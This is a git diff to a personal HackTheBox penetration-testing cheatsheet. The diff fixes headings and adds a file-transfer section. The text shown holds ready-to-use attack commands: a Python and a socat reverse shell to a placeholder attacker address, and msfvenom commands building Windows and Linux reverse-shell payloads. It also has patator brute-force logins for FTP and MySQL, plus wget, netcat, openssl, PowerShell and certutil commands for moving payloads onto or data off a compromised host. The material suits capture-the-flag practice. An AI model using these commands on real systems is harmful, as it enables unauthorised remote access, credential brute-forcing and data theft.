@@ -33,13 +33,12 @@ My personal HackTheBox Cheatsheet from any sources.
   - [Metasploit (Payload)](#metasploit-payload)
   - [ysoserial.net (Windows)](https://github.com/pwntester/ysoserial.net)
 - File Transfer
-  - wget
-  - curl
-  - netcat
-  - openssl
-  - PowerShell
-  - PowerShell (Invoke-WebRequest)
-  - certutil
+  - [wget](#wget)
+  - [curl](#curl)
+  - [netcat](#netcat)
+  - [openssl](#openssl)
+  - [PowerShell](#powershell)
+  - [certutil](#certutil)
 - Port Forwarding
   - ssh
   - chisel
@@ -210,7 +209,7 @@ Source: https://github.com/lanjelot/patator
 patator ftp_login user=<USER> password=FILE0 0=<WORDLIST> host=<IP/DOMAIN> -x ignore:mesg='Login incorrect.'          # brute-force ftp
 patator mysql_login user=<USER> password=FILE0 0=<WORDLIST> host=<IP/DOMAIN> -x ignore:fgrep='Access denied for user' # brute-force mysql
 ```
-#### Revere Shell (Python)
+#### Reverse Shell (Python)
 ```sh
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
@@ -249,8 +248,8 @@ Victim:
 ```sh
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<IP>:<PORT>
 ```
-##### Metasploit (Payload)
-Source: https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/\
+#### Metasploit (Payload)
+Source: https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/ \
 Non-Meterpreter:
 ```sh
 msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe # staged windows x86
@@ -278,4 +277,53 @@ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > s
 
 msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf # stageless linux x86
 msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf # stageless linux x64
+```
+#### wget
+GNU Wget is a free utility for non-interactive download of files from the Web. It supports HTTP, HTTPS, and FTP protocols, as well as retrieval through HTTP proxies.\
+Source: https://www.gnu.org/software/wget/
+```sh
+wget http://[IP]/file
+wget --no-check-certificate http://[IP]/file
+```
+#### curl
+curl is a tool to transfer data from or to a server, using one of the supported protocols (DICT, FILE, FTP, FTPS, GOPHER, HTTP, HTTPS, IMAP, IMAPS, LDAP, LDAPS, POP3, POP3S, RTMP, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET and TFTP).\
+Source: https://curl.se/
+```sh
+curl http://[IP]/file           # print output to stdout
+curl http://[IP]/file -o [FILE] # save output to file
+```
+#### netcat
+Netcat usually used for reverse shell, but you can also use it for transfer files.
+```sh
+receiver:~$ nc -nvlp [PORT] > filename
+sender:~$ cat file | nc -w 2 [IP_RECEIVER] [PORT]
+```
+#### openssl
+Openssl can be used for transfer file.\
+Source: https://www.openssl.org/
+More info: https://gtfobins.github.io/gtfobins/openssl/ \
+Receiver:
+```
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+openssl s_server -quiet -key key.pem -cert cert.pem -port [PORT] > filename
+```
+Sender:
+```
+openssl s_client -quiet -connect <RECEIVER_IP>:<PORT> < "<FILE>"
+```
+#### PowerShell
+Source: https://docs.microsoft.com/en-us/powershell/ \
+WebClient:
+```
+(New-Object System.Net.WebClient).DownloadFile("[URL]", "[PATHTOFILE]")
+```
+Invoke-WebRequest
+```
+Invoke-WebRequest -Uri [URL] -OutFile [PATHTOFILE]
+```
+#### certutil
+The purpose of the certutil was originally for certificate and CA management, but can also be used for file transfer.\
+Source: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil
+```
+certutil -urlcache -f http://192.168.1.2/putty.exe putty.exe
 ```
